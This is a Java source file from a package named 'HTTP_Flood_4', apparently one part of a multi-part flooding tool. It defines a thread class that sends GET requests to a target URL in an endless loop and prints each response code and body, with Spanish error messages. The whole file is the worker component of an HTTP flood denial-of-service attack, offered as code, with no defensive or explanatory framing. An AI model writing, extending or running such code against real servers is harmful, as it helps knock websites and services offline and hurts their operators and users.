package HTTP_Flood_4;

import Service_Port_Flood_3.Hilo3;
import java.io.BufferedReader;
import java.io.IOException;
import java.io.InputStreamReader;
import java.net.HttpURLConnection;
import java.net.URL;

public class Hilo4 extends Thread {

    private URL url;
    HttpURLConnection con;

    public Hilo4(URL url) {
        this.url = url;
    }

    public void run() {
        BufferedReader in = null;
        String inputLine;
        StringBuffer response;
        try {
            while (true) {
                con = (HttpURLConnection) url.openConnection();
                con.setRequestMethod("GET");
                int respuesta = con.getResponseCode();
                System.out.println("\nSending 'GET' request to URL : " + url);
                System.out.println("Response Code : " + respuesta);
                
                in = new BufferedReader(new InputStreamReader(con.getInputStream()));
		response = new StringBuffer();

		while ((inputLine = in.readLine()) != null) {
			response.append(inputLine);
		}
		in.close();
                con.disconnect();
		//print result
		System.out.println(response.toString());
            }
        } catch (Exception ex) {
            System.out.println("Error al establecer conexión");
            System.out.println(ex.getMessage());
            try {
                in.close();
            } catch (IOException ex1) {
                System.out.println("Error al cerrar el BufferedReader");
            }
            con.disconnect();
        }
    }
}
